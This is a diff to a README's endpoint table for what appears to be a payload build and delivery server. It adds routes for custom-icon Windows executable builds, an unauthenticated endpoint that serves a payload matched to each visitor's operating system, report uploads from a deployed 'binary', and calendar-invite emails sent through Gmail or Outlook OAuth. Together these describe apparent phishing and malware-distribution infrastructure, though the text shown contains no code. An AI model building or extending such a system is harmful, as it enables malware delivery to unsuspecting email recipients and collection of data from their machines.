@@ -89,23 +89,34 @@ Then re-run the deploy script. No other credentials needed.
 
 ## Server endpoints
 
-| Path | Description |
-|------|-------------|
-| `GET /` | Reports index (auth required) |
-| `POST /upload` | Receive payload report (Bearer auth) |
-| `GET /r/{id}` | View report |
-| `POST /r/{id}/delete` | Delete single report |
-| `POST /r/delete-bulk` | Delete multiple reports — JSON body `{"ids":["..."]}` |
-| `GET /payloads` | Payload file manager + build command generator |
-| `POST /payloads` | Upload payload file |
-| `POST /payloads/{name}/delete` | Delete payload file |
-| `GET /builds` | List build jobs (JSON) |
-| `POST /builds` | Queue a new build job |
-| `POST /builds/claim` | Build agent: claim next pending job |
-| `GET /builds/{id}/icon` | Download custom icon for a job |
-| `POST /builds/{id}/complete` | Build agent: upload completed exe |
-| `POST /builds/{id}/fail` | Build agent: report build failure |
-| `POST /builds/{id}/delete` | Remove a job from the queue |
+| Path | Auth | Description |
+|------|------|-------------|
+| `GET /` | Required | Reports index |
+| `POST /login` | — | Browser login (sets session cookie) |
+| `POST /upload` | Bearer | Receive payload report (called by the binary) |
+| `GET /r/{id}` | Required | View single report |
+| `POST /r/{id}/delete` | Required | Delete single report |
+| `POST /r/delete-bulk` | Required | Delete multiple reports — JSON `{"ids":[...]}` |
+| `GET /r/export-bulk` | Required | Export reports as zip — query `?ids=...` |
+| `GET /payloads` | Required | Payload manager + build command generator |
+| `POST /payloads` | Required | Upload payload file |
+| `GET /payloads/{name}` | Required | Download payload file |
+| `POST /payloads/{name}/delete` | Required | Delete payload file |
+| `GET /p/{preset}` | **None** | Smart delivery — detects visitor OS, serves matching payload |
+| `GET /builds` | Required | List build queue (JSON) |
+| `POST /builds` | Required | Queue a new Windows build job |
+| `POST /builds/claim` | Bearer | Build agent: claim the next pending job |
+| `GET /builds/{id}/icon` | Bearer | Build agent: download custom icon for a job |
+| `POST /builds/{id}/complete` | Bearer | Build agent: upload completed exe |
+| `POST /builds/{id}/fail` | Bearer | Build agent: report a build failure |
+| `POST /builds/{id}/delete` | Required | Remove a job from the queue |
+| `GET /invite/config` | Required | Get email delivery config (JSON) |
+| `POST /invite/config` | Required | Save email delivery config (SMTP / OAuth provider) |
+| `POST /invite/send` | Required | Send a calendar invite via email |
+| `GET /auth/status` | Required | OAuth connection status (Gmail / Outlook) |
+| `GET /auth/{provider}/connect` | Required | Start OAuth flow (`gmail` or `outlook`) |
+| `GET /auth/{provider}/callback` | — | OAuth redirect handler (unauthenticated — provider redirects here) |
+| `POST /auth/{provider}/disconnect` | Required | Remove stored OAuth token |
 
 ## Known issues / history
 
